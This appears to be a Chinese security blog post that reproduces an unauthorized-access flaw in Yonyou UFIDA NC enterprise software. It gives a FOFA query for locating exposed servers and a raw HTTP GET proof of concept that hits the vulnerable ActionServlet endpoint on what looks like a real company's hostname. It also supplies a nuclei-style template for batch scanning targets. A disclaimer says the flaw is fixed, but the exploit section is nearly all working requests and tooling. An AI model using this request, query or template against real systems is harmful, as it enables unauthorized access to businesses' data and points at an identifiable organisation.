# 原创
：  漏洞复现--用友UFIDA NC未授权访问

# 漏洞复现--用友UFIDA NC未授权访问

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责**

### 一：漏洞描述

用友NC是一套功能全面、灵活度高、可定制性强的企业管理软件，能够帮助企业提升管理效率、优化资源配置、提高竞争力.该产品存在未授权访问漏洞

### 二：漏洞影响版本

UFIDA-NC

### 三：网络空间测绘查询

fofa:<br/> `product="用友-UFIDA-NC"`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/e70a867260ab9b1202762d7340fcab49.jpeg"/>

### 四：漏洞复现

POC:

```
GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.release.InfoReleaseAction&amp;method=createBBSRelease&amp;TreeSelectedID=&amp;TableSelectedID= HTTP/1.1
Host: nc.shijian-group.cn
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/86c97c73c7914ea6cd98ee1a09dff162.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/39424105782ba361ee52baa7d0be609d.jpeg"/>

### 五：批量检测

```
id: seeyon-UFIDA-NC-Unauthorized-access

info:
  name: seeyon-UFIDA-NC-Unauthorized-access
  author: 芝士土拨鼠
  severity: high
  description: 用友NC是一套功能全面、灵活度高、可定制性强的企业管理软件，能够帮助企业提升管理效率、优化资源配置、提高竞争力.该产品存在未授权访问漏洞

requests:
  - raw:
      - |+
        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.release.InfoReleaseAction&amp;method=createBBSRelease&amp;TreeSelectedID=&amp;TableSelectedID= HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close


    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - '200'
      - type: status
        status:
          - 200

```
